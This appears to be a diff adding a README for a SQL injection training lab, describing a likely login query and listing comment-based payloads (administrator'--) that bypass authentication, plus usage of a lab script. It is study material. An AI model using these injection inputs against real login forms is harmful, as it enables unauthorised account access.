@@ -1,0 +1,15 @@
+This lab contains a SQL injection vulnerability in the login function.
+
+Goal: Perform a SQL injection attack that logs in to the application as the administrator user.
+
+Analysis
+--------
+Query may look something like this: select * from accounts where username = "username" and password = "password"
+
+Potential payloads:
+administrator'--
+or
+administrator"--
+
+Script Usage:
+./sqli-lab-02.py http://example.com "administrator'--"
